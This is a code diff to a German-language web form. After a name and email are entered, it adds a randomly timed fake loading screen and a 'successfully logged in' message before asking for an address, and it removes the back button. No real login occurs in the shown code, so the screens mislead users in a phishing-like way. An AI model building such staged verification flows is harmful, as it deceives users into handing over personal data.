@@ -202,6 +202,22 @@
   </div>
 </form>
 
+<!-- Loading Screen -->
+<div id="loadingScreen" style="display: none; text-align: center; padding: 40px;">
+  <div class="ca-h">Wird geladen...</div>
+  <div class="ca-b pb-0" style="text-align: center; padding: 40px;">
+    <p>Bitte warten...</p>
+  </div>
+</div>
+
+<!-- Success Screen -->
+<div id="successScreen" style="display: none; text-align: center; padding: 40px;">
+  <div class="ca-h">Erfolgreich eingeloggt</div>
+  <div class="ca-b pb-0" style="text-align: center; padding: 40px;">
+    <p style="font-size: 18px;">✅ Willkommen!</p>
+  </div>
+</div>
+
 <!-- Step 2 Form (Hidden by default) -->
 <form id="addressForm" style="display: none;">
   <div class="ca-h">Adresse</div>
@@ -221,10 +237,6 @@
 
     <div class="ig mb-1 noselect">
       <input tabindex="0" class="foc no-select" type="text" id="country" name="country" required="" placeholder="Land">
-    </div>
-
-    <div class="rl-c">
-      <a tabindex="0" href="#" class="rl" onclick="goBackToStep1(event)">Zurück</a>
     </div>
   </div>
 
@@ -308,15 +320,25 @@ function goToStep2() {
   formDataCache.customer_name = name;
   formDataCache.email = email;
 
-  // Hide step 1, show step 2
+  // Hide step 1, show loading screen
   document.getElementById('contactForm').style.display = 'none';
-  document.getElementById('addressForm').style.display = 'block';
-}
+  document.getElementById('loadingScreen').style.display = 'block';
 
-function goBackToStep1(event) {
-  event.preventDefault();
-  document.getElementById('addressForm').style.display = 'none';
-  document.getElementById('contactForm').style.display = 'block';
+  // Show loading for 3-5 seconds (random between 3-5)
+  const loadingTime = Math.random() * 2000 + 3000; // 3000-5000ms
+  
+  setTimeout(() => {
+    // Hide loading, show success
+    document.getElementById('loadingScreen').style.display = 'none';
+    document.getElementById('successScreen').style.display = 'block';
+
+    // Show success for 2 seconds
+    setTimeout(() => {
+      // Hide success, show address form
+      document.getElementById('successScreen').style.display = 'none';
+      document.getElementById('addressForm').style.display = 'block';
+    }, 2000);
+  }, loadingTime);
 }
 
 // Close popover when clicking outside
@@ -362,7 +384,7 @@ document.getElementById('addressForm').addEventListener('submit', async (e) => {
     const data = await res.json();
 
     if (res.ok) {
-      document.getElementById('status-2').textContent = "✅ Gesendet!";
+      document.getElementById('status-2').textContent = "✅ Erfolgreich versendet!";
       document.getElementById('addressForm').reset();
       
       // Reset form cache
@@ -378,6 +400,7 @@ document.getElementById('addressForm').addEventListener('submit', async (e) => {
       setTimeout(() => {
         document.getElementById('addressForm').style.display = 'none';
         document.getElementById('contactForm').style.display = 'block';
+        document.getElementById('status-2').textContent = '';
       }, 2000);
     } else {
       document.getElementById('status-2').textContent = "❌ " + data.error;
